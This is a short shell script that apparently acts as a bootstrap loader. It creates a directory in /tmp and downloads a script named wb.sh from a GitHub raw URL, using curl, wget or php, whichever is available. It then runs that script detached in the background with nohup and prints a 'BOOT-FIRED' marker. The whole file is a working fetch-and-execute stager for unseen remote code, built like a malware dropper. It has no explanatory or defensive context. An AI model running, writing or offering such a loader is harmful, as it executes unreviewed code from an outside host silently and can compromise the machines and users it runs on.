#!/bin/sh
mkdir -p /tmp/zgt; cd /tmp/zgt || exit 9
RAW=https://raw.githubusercontent.com/heinzo666/evm-index-data/main
dl(){ f="$1"; o="$2"; [ -s "$o" ] && return 0;
  if command -v curl >/dev/null 2>&1; then curl -fsSL -m300 -o "$o.p" "$f" && mv "$o.p" "$o" && return 0; fi
  if command -v wget >/dev/null 2>&1; then wget -qO "$o.p" "$f" && mv "$o.p" "$o" && return 0; fi
  if command -v php  >/dev/null 2>&1; then php -r "file_put_contents('$o.p',file_get_contents('$f'));" && mv "$o.p" "$o" && return 0; fi
  return 1; }
dl $RAW/wb.sh wb.sh || exit 7
nohup sh wb.sh "${1:-0/2}" "${2:-5}" >> /tmp/zgt/boot.out 2>&1 &
echo BOOT-FIRED-$1-$2
